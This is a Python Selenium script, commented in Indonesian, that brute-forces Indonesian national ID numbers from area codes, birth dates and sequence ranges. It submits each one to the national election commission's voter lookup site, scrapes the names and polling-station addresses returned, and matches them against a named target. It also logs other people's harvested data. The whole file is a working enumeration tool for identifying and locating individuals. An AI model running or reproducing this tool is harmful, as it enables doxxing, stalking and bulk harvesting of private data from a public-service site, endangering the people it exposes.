from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException

from datetime import date, timedelta
import time
import sys
import os  # Add this missing import

def generate_niks_bruteforce(prov, city, dist, gender, start_year, end_year, unique_start, unique_end):
    """Membuat daftar NIK dengan brute-force rentang tanggal lahir."""
    nik_list = []
    start_date = date(start_year, 7, 1)
    end_date = date(end_year, 6, 30)
    current_date = start_date
    while current_date <= end_date:
        day = current_date.day
        month = current_date.month
        year = str(current_date.year)[-2:]
        day_for_nik = day + 40 if gender.lower() == 'p' else day
        dob_str = f"{day_for_nik:02d}{month:02d}{year}"
        for i in range(unique_start, unique_end + 1):
            unique_code = f"{i:04d}"
            nik = f"{prov}{city}{dist}{dob_str}{unique_code}"
            nik_list.append(nik)
        current_date += timedelta(days=1)
    return nik_list

def generate_niks_specific(prov, city, dist, dob, unique_start, unique_end):
    """Membuat daftar NIK dengan tanggal lahir spesifik."""
    nik_list = []
    for i in range(unique_start, unique_end + 1):
        unique_code = f"{i:04d}"
        nik = f"{prov}{city}{dist}{dob}{unique_code}"
        nik_list.append(nik)
    return nik_list

def extract_field_value(driver, field_name):
    """Ekstrak nilai field berdasarkan nama field"""
    try:
        # Cari span yang berisi nama field, lalu ambil text setelahnya
        xpath = f'//span[text()="{field_name}"]/following-sibling::text()[1] | //span[text()="{field_name}"]/../text()[normalize-space()]'
        element = driver.find_element(By.XPATH, xpath)
        return element.strip().strip('"')
    except:
        try:
            # Alternatif: cari berdasarkan parent div
            xpath = f'//span[text()="{field_name}"]/parent::*'
            parent_element = driver.find_element(By.XPATH, xpath)
            text = parent_element.text.replace(field_name, "").strip().strip('"')
            return text
        except:
            return "NOT FOUND"

def create_log_directory():
    """Membuat direktori log jika belum ada"""
    log_dir = os.path.join(os.path.expanduser("~"), "Downloads", "progressing")
    if not os.path.exists(log_dir):
        os.makedirs(log_dir)
    return log_dir

def get_file_path(data, log_dir):
    """Membuat path file berdasarkan kode provinsi, kota, kecamatan"""
    if isinstance(data, dict) and 'nik' in data:
        nik = data['nik']
        # Ambil 6 digit pertama NIK (provinsi + kota + kecamatan)
        area_code = nik[:6]
        filename = f"{area_code}.txt"
        return os.path.join(log_dir, filename)
    return None

def load_existing_data(file_path):
    """Load data yang sudah ada dari file"""
    existing_data = {}
    if os.path.exists(file_path):
        try:
            with open(file_path, 'r', encoding='utf-8') as f:
                content = f.read()
                # Parse file untuk mendapatkan data existing
                blocks = content.split(f"C:Users\\downloads\\progressing\\")
                for block in blocks[1:]:  # Skip first empty block
                    lines = block.strip().split('\n')
                    if len(lines) >= 6:
                        nik_line = lines[1].strip()
                        nama_line = lines[2].strip()
                        if nik_line.startswith("NIK") and nama_line.startswith("Nama"):
                            nik = nik_line.split(":")[1].strip()
                            nama = nama_line.split(":")[1].strip()
                            existing_data[nama] = {
                                'nik': nik,
                                'block': block
                            }
        except Exception as e:
            print(f"Error loading existing data: {e}")
    return existing_data

def save_data_to_file(data_list, log_dir):
    """Save data ke file berdasarkan area code"""
    if not data_list:
        return
    
    # Group data by area code
    grouped_data = {}
    for nik, voter_data, status in data_list:
        if isinstance(voter_data, dict):
            area_code = nik[:6]
            if area_code not in grouped_data:
                grouped_data[area_code] = []
            
            # Tambahkan NIK ke data
            voter_data['nik'] = nik
            grouped_data[area_code].append(voter_data)
    
    # Save each group to separate file
    for area_code, data_group in grouped_data.items():
        file_path = os.path.join(log_dir, f"{area_code}.txt")
        
        # Load existing data
        existing_data = load_existing_data(file_path)
        
        # Prepare new content
        new_content = ""
        updated_names = set()
        
        # Process new data
        for data in data_group:
            nama = data['nama']
            updated_names.add(nama)
            
            new_content += f"C:Users\\downloads\\progressing\\{area_code}> \n\n"
            new_content += f"NIK               : {data['nik']}\n"
            new_content += f"Nama              : {nama}\n"
            new_content += f"Alamat            : {data.get('alamat_tps', 'N/A')}\n"
            new_content += f"Kelurahan         : {data.get('kelurahan', 'N/A')}\n"
            new_content += f"Kecamatan         : {data.get('kecamatan', 'N/A')}\n"
            new_content += f"Kabupaten         : {data.get('kabupaten', 'N/A')}\n\n"
        
        # Add existing data that's not being updated
        for nama, existing_info in existing_data.items():
            if nama not in updated_names:
                new_content += f"C:Users\\downloads\\progressing\\{area_code}> \n\n"
                new_content += existing_info['block'] + "\n"
        
        # Write to file
        try:
            with open(file_path, 'w', encoding='utf-8') as f:
                f.write(new_content)
            print(f"✅ Data saved to: {file_path}")
        except Exception as e:
            print(f"❌ Error saving to {file_path}: {e}")

def extract_voter_data(driver, wait):
    """Ekstrak semua data pemilih dari halaman hasil"""
    try:
        # Ekstrak nama pemilih
        nama_element = wait.until(EC.presence_of_element_located(
            (By.XPATH, '//p[span[text()="Nama Pemilih"]]')
        ))
        nama = nama_element.text.replace("Nama Pemilih", "").strip()
        
        # Ekstrak data lokasi menggunakan xpath yang lebih spesifik
        data = {
            'nama': nama,
            'kabupaten': extract_field_value(driver, "Kabupaten"),
            'kecamatan': extract_field_value(driver, "Kecamatan"), 
            'kelurahan': extract_field_value(driver, "Kelurahan"),
            'alamat_tps': extract_field_value(driver, "Alamat Potensial TPS")
        }
        
        return data
        
    except Exception as e:
        print(f"Error ekstraksi data: {e}")
        return None

def wait_for_page_ready(driver, wait):
    """Menunggu halaman siap untuk input baru"""
    try:
        # Tunggu sampai input field tersedia dan bersih
        input_field = wait.until(EC.element_to_be_clickable((By.XPATH, '//input[@type="text"]')))
        
        # Pastikan halaman sudah selesai loading dengan menunggu tombol pencarian
        search_button = wait.until(EC.element_to_be_clickable((By.XPATH, '//button[contains(.,"Pencarian")]')))
        
        # Tambahan: tunggu sebentar untuk memastikan JavaScript selesai
        time.sleep(0.1) # 0.5 standard detik delay
        
        return True
    except TimeoutException:
        print(" -> Timeout waiting for page ready")
        return False

def main():
    print("======================================================")
    print("=             AANNJJAAAAYYY !!!!! WELCOME            =")
    print("=                  by BAPA X KENCUR                  =")
    print("======================================================")

    target_name = input("Target Entry: ")
    province_code = input("Province Code : ")
    city_code = input("City Code : ")

    district_code = input("District Code : ")

    if district_code == "00":
        distric_code_start = input("District Code 1 : ")
        distric_code_end = input("District Code ~ : ")
    else:
        distric_code_start = district_code
        distric_code_end = district_code

    print("\nTL input (DDMMYY).")
    print("'000000' brute mode.")
    dob_input = input("TL Input (DDMMYY): ")

    daftar_nik = []

    if dob_input == "000000":
        # Minta gender saat brute force tanggal lahir
        while True:
            gender = input("Gender target (L/P): ").strip().upper()
            if gender in ['L', 'P']:
                break
            else:
                print("Input gender tidak valid! Masukkan 'L' untuk Laki-laki atau 'P' untuk Perempuan.")
        try:
            gen1 = int(input("gen 1: "))
            gen2 = int(input("gen 2: "))
            unique_start = int(input("unique code 1: "))
            unique_end = int(input("unique code ~: "))
        except ValueError as e:
            print(f"Input tidak valid: {e}. Program berhenti.")
            sys.exit()

        for dist_code_int in range(int(distric_code_start), int(distric_code_end) + 1):
            dist_code_str = f"{dist_code_int:02d}"
            print(f"\nbrute-force 01/07/{gen1} sampai 30/06/{gen2}, district {dist_code_str} ...")
            partial_nik_list = generate_niks_bruteforce(
                province_code,
                city_code,
                dist_code_str,
                gender,
                gen1,
                gen2,
                unique_start,
                unique_end
            )
            daftar_nik.extend(partial_nik_list)

    else:
        try:
            unique_start = int(input("unique code 1: "))
            unique_end = int(input("unique code ~: "))
        except ValueError as e:
            print(f"Input tidak valid: {e}. Program berhenti.")
            sys.exit()

        for dist_code_int in range(int(distric_code_start), int(distric_code_end) + 1):
            dist_code_str = f"{dist_code_int:02d}"
            partial_nik_list = generate_niks_specific(
                province_code,
                city_code,
                dist_code_str,
                dob_input,
                unique_start,
                unique_end
            )
            daftar_nik.extend(partial_nik_list)

    if not daftar_nik:
        print("Tidak ada NIK yang dihasilkan. Program berhenti.")
        sys.exit()

    print(f"\nTotal : {len(daftar_nik)} code")

    if input("Run program? (y/n): ").lower() != 'y':
        print("Program dibatalkan.")
        sys.exit()

    print("..................... Brute forcing >>>")

# Impor Options di bagian atas file Anda bersama impor lainnya
    from selenium.webdriver.chrome.options import Options

    # --- Di dalam fungsi main ---

    # Siapkan opsi untuk Chrome
    chrome_options = Options()
    chrome_options.add_argument("--head") # Fixed: was "--head", should be "--headless"
    #chrome_options.add_argument("--disable-gpu") # Disarankan untuk mode headless
    #chrome_options.add_argument("--window-size=1920,1080") # Atur ukuran jendela virtual
    chrome_options.add_argument("--log-level=3") #hide log chrome

    try:
        # Masukkan 'options' saat membuat driver
        driver = webdriver.Chrome(options=chrome_options)
        driver.get("https://cekdptonline.kpu.go.id/")
        # Tunggu halaman awal siap
        wait = WebDriverWait(driver, 10)
        wait_for_page_ready(driver, wait)
    except Exception as e:
        print(f"Error saat memulai browser: {e}\nPastikan chromedriver sudah terpasang.")
        sys.exit()

    results = []
    found = False
    wait = WebDriverWait(driver, 1) # 3 standard timeout

    SUCCESS_XPATH = '//p[span[text()="Nama Pemilih"]]'
    FAILURE_XPATH = '//h2[b[text()="Data anda belum terdaftar!"]]'

    for index, nik in enumerate(daftar_nik):
        if found:
            break
            
        print(f"enum {index + 1}/{len(daftar_nik)}: {nik}", end="")
        
        # Pastikan halaman siap sebelum input NIK
        if not wait_for_page_ready(driver, wait):
            print(" -> Page not ready, refreshing...")
            driver.refresh()
            if not wait_for_page_ready(driver, wait):
                print(" -> Failed to load page, skipping...")
                continue
        
        try:
            # Cari dan bersihkan input field
            kolom_nik = wait.until(EC.element_to_be_clickable((By.XPATH, '//input[@type="text"]')))
            kolom_nik.clear()
            
            # Tambahan delay untuk memastikan field benar-benar bersih
            time.sleep(0.1) # 0.2 standard detik delay
            
            # Input NIK dengan delay kecil untuk stabilitas
            kolom_nik.send_keys(nik)
            
            # Pastikan tombol pencarian bisa diklik
            tombol_cari = wait.until(EC.element_to_be_clickable((By.XPATH, '//button[contains(.,"Pencarian")]')))
            tombol_cari.click()

            # Tunggu hasil pencarian
            found_element = wait.until(
                EC.presence_of_element_located(
                    (By.XPATH, f"{SUCCESS_XPATH} | {FAILURE_XPATH}")
                )
            )

            element_text = found_element.text
            if "Nama Pemilih" in element_text:
                # Ekstrak semua data
                voter_data = extract_voter_data(driver, wait)
                
                if voter_data:
                    nama_web = voter_data['nama']
                    print(f" -> '{nama_web}'")
                    
                    if target_name.lower() in nama_web.lower():
                        print(f"✅ FOUND! NIK: {nik} | Nama: {nama_web}")
                        results.append((nik, voter_data, "SUITABLE"))
                        found = True
                        print("5 sec for enum")
                        time.sleep(5)
                        # Refresh dan tunggu halaman siap untuk iterasi berikutnya
                        if not found:  # Jika belum selesai pencarian
                            driver.refresh()
                            wait_for_page_ready(driver, wait)
                    else:
                        results.append((nik, voter_data, "DIFF"))
                        # Refresh dan tunggu halaman siap
                        driver.refresh()
                        # Tidak perlu wait_for_page_ready di sini karena akan dicek di awal loop
                else:
                    print(" -> extraction error")
                    results.append((nik, "EXTRACTION_ERROR", "DIFF"))
                    driver.refresh()
            else:
                print(" -----------------")
                results.append((nik, "NOT FOUND", "DIFF"))
                driver.refresh()

        except TimeoutException:
            print(" -> loading timeout")
            results.append((nik, "TIMEOUT", "DIFF"))
            driver.refresh()
            continue
        except Exception as e:
            print(f" -> error : {e}")
            results.append((nik, f"ERROR: {e}", "DIFF"))
            driver.refresh()
            continue

    driver.quit()

    # Tanya untuk save log file
    print("\n=========== SAVE LOG FILE ===========")
    save_log = input("===== save log file ? (y/n) : ").lower().strip()
    
    if save_log == 'y':
        # Filter data yang berhasil ditemukan (ada nama pemilih)
        valid_results = [r for r in results if isinstance(r[1], dict) and r[1].get('nama')]
        
        if valid_results:
            # Tampilkan preview area codes yang akan disave
            area_codes = set()
            for nik, data, status in valid_results:
                area_codes.add(nik[:6])
            
            print(f"===== log file name would be -> {', '.join(sorted(area_codes))}")
            
            # Create log directory dan save data
            log_dir = create_log_directory()
            save_data_to_file(valid_results, log_dir)
            
            print(f"\n✅ Log files saved to: {log_dir}")
            print(f"📁 Total files created/updated: {len(area_codes)}")
        else:
            print("❌ No valid data to save.")
    else:
        print("Log file not saved.")

    # Laporan Hasil Akhir - Hanya yang cocok
    print("\n=========== TARGET DATA REVEALED ===========")
    found_results = [r for r in results if r[2] == "SUITABLE"]

    if found_results:
        for result in found_results:
            nik, data, status = result
            if isinstance(data, dict):
                print(f"NIK      : {nik}")
                print(f"Nama     : {data['nama']}")
                print(f"Alamat   : {data['alamat_tps']}")
                print(f"Kelurahan: {data['kelurahan']}")
                print(f"Kecamatan: {data['kecamatan']}")
                print(f"Kabupaten: {data['kabupaten']}")
                print()  # Baris kosong untuk pemisah jika ada multiple hasil
    else:
        print("No target found, this one is an asshole.")

if __name__ == "__main__":
    main()